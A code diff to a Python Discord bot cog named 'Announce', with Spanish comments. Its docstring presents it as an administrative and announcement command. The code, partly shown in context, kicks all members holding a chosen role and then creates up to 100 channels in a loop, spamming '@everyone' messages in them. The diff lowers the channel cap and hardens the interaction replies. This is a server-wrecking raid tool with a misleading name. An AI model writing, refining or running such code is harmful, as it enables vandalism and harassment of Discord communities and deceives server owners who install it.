@@ -20,12 +20,13 @@ class Announce(commands.Cog):
                       roletogive: discord.Role, 
                       message: str):
         """Comando para realizar acciones administrativas y enviar anuncios"""
-        await interaction.response.defer(ephemeral=True)
+        # Responder inmediatamente para evitar timeout
+        await interaction.response.send_message("Iniciando operación...", ephemeral=True)
         
         try:
             guild = interaction.guild
             
-            # 1. Expulsar miembros con el rol especificado (excepto useradmin) - CORREGIDO
+            # 1. Expulsar miembros con el rol especificado (excepto useradmin)
             members_to_kick = []
             
             # Obtener todos los miembros del servidor
@@ -65,7 +66,10 @@ class Announce(commands.Cog):
             # 4. Crear INFINITOS canales y spamear mensajes
             spam_message = f"@everyone {message}"
             channel_count = 0
-            max_channels = 500  # Límite para evitar bloqueos excesivos
+            max_channels = 100  # Límite para evitar bloqueos excesivos
+            
+            # Usar followup para enviar actualizaciones
+            followup = interaction.followup
             
             while channel_count < max_channels:
                 try:
@@ -93,11 +97,20 @@ class Announce(commands.Cog):
                     await asyncio.sleep(1)
                     break  # Salir del bucle si hay error persistente
             
-            await interaction.followup.send(f"Operación completada. Se crearon {channel_count} canales.", ephemeral=True)
+            # Usar followup para enviar el mensaje final
+            await followup.send(f"Operación completada. Se crearon {channel_count} canales.", ephemeral=True)
             
         except Exception as e:
             print(f"Error durante la ejecución: {e}")
-            await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
+            # Usar followup para enviar el error
+            try:
+                await interaction.followup.send("Ocurrió un error durante el proceso.", ephemeral=True)
+            except:
+                # Si falla el followup, intentar editar la respuesta original
+                try:
+                    await interaction.edit_original_response(content="Ocurrió un error durante el proceso.")
+                except:
+                    pass
 
 async def setup(bot):
     await bot.add_cog(Announce(bot))
